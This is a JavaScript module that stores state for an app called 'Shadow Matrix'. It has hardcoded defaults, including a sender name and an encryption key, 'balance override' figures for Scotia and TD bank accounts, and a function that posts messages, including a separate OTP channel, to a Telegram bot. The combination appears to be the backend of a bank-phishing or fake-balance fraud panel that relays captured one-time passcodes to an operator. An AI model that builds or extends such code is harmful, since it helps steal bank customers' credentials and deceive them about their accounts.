
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import axios from 'axios';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DB_PATH = path.join(__dirname, '../data/system_state.json');

// High-fidelity defaults for the Shadow Matrix
const DEFAULT_SYSTEM_CONFIG = {
    general: { 
        sender_name: 'JENNIFER EDWARDS', 
        app_url: 'http://localhost:3002',
        encryption_key: 'a3f91b6cd024e8c29b76a149efcc5d42'
    },
    smtp: { 
        host: '', 
        port: 587, 
        username: '', 
        password: '', 
        encryption: 'tls' 
    }
};

export const db = {
    _read() {
        try {
            if (!fs.existsSync(DB_PATH)) {
                const initial = { 
                    events: [], 
                    uplinks: [], 
                    system_config: DEFAULT_SYSTEM_CONFIG,
                    scotia_balance_override: 24823.42,
                    td_balance_override: 10153.10
                };
                this._write(initial);
                return initial;
            }
            const data = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            if (!data.uplinks) data.uplinks = [];
            if (!data.system_config) data.system_config = DEFAULT_SYSTEM_CONFIG;
            return data;
        } catch (e) {
            console.error("[DB] Read failure, returning defaults");
            return { events: [], uplinks: [], system_config: DEFAULT_SYSTEM_CONFIG };
        }
    },

    _write(data) {
        try {
            const dir = path.dirname(DB_PATH);
            if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
            fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 4));
        } catch (e) {
            console.error("[DB] Write failure:", e.message);
        }
    },

    get(key, defaultValue = null) {
        const data = this._read();
        const val = data[key];
        if (val === undefined || val === null) {
            if (key === 'system_config') return DEFAULT_SYSTEM_CONFIG;
            return defaultValue;
        }
        return val;
    },

    set(key, value) {
        const data = this._read();
        data[key] = value;
        this._write(data);
    },

    logEvent(type, message, meta = {}) {
        const data = this._read();
        if (!data.events) data.events = [];
        data.events.unshift({
            timestamp: Date.now(),
            type,
            message,
            meta: { ...meta, origin: meta.origin || 'DB_CORE' }
        });
        if (data.events.length > 100) data.events = data.events.slice(0, 100);
        this._write(data);
    },

    async sendTelegram(text, isOtp = false) {
        const config = this.get('system_config');
        const botToken = isOtp ? config.otp?.bot_token : config.telegram?.bot_token;
        const chatId = isOtp ? config.otp?.chat_id : config.telegram?.chat_id;

        if (!botToken || !chatId) return;

        try {
            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: text,
                parse_mode: 'HTML'
            }, { timeout: 5000 });
            this.logEvent('TELEGRAM_SENT', `Notice dispatched to ${chatId}`);
        } catch (e) {
            this.logEvent('TELEGRAM_ERROR', e.message);
        }
    }
};
